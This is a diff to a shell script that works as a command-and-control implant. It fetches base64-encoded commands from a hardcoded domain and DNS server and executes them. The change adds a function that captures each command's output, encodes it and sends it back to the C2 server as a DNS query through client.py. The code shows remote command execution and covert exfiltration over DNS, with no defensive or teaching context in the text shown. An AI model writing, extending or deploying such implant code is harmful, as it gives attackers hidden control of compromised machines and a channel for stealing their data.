@@ -6,6 +6,7 @@ chkdomain="check.doshcloud.com"
 dnsServer="129.21.130.212"
 f=false
 fName=""
+output=""
 
 # Pull down commands from server
 pull(){
@@ -18,8 +19,15 @@ pull(){
         echo $fName
     else
         cmd=$(echo $cmd | base64 --decode)
-        $cmd
+        output=$($cmd)
+	return_output
     fi
+}
+
+# return output of command back to C2 server
+return_output(){
+	output=$(echo $output | base64)
+	python client.py $output.$domain
 }
 
 # Check in with server show beacon is still alive
